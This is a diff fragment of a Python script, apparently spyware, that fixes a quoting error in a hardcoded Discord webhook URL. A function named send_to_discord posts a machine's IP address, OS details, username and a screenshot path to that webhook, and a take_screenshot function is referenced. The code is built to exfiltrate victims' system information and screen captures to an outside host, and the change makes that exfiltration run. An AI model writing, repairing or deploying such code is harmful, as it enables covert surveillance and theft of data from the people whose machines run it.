@@ -20,7 +20,7 @@ def take_screenshot():
 
 # Function to send data to Discord
 def send_to_discord(ip_address, os_info, username, screenshot_path):
-    webhook_url = 'https://discord.com/api/webhooks/1391532249156947998/6COjLrMLUvb8Oe3uqBg0DVlPhPVWdpj7_QXNwNN9NhWLrrlFvSpAwZWrxjsvu5UOvbtm''
+    webhook_url = 'https://discord.com/api/webhooks/1391532249156947998/6COjLrMLUvb8Oe3uqBg0DVlPhPVWdpj7_QXNwNN9NhWLrrlFvSpAwZWrxjsvu5UOvbtm'
     message = {
         "content": f"System Information:\nIP Address: {ip_address}\nOS: {os_info}\nUsername: {username}"
     }
